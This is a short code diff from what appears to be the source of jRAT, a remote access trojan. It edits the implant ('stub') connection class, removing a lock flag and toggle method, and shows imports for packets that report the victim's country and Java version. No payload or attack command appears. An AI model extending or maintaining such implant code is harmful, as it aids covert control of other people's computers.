@@ -41,9 +41,7 @@ import se.jrat.stub.packets.outgoing.Packet8InitCountry;
 import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 
 public class Connection implements Runnable {
-
-	public static boolean lock;
-
+	
 	public static Socket socket;
 	public static boolean busy = false;
 	public static FrameChat frameChat;
@@ -240,9 +238,5 @@ public class Connection implements Runnable {
 
 	public static void status(int status) {
 		addToSendQueue(new Packet2Status(status));
-	}
-
-	public static void lock() {
-		lock = !lock;
 	}
 }
